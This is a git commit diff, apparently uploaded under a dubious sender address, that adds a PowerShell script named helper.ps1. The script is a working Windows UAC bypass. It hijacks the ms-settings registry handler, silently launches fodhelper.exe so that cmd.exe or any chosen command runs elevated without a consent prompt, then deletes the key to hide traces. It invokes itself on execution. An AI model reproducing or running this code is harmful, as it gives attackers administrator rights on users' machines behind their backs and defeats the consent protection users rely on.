1749aa0152cb505ebd50914cacc09e5d1510fafe
Peter Griffin <noreply.steampoqered.com.5@gmail.com>
2026-03-03 14:39:24 +0000

    Add files via upload

---
+++ helper.ps1
@@ -0,0 +1,13 @@
+function ffv(){ 
+ Param (
+           
+        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe"
+       )
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+    Start-Sleep 3
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+}
+ffv
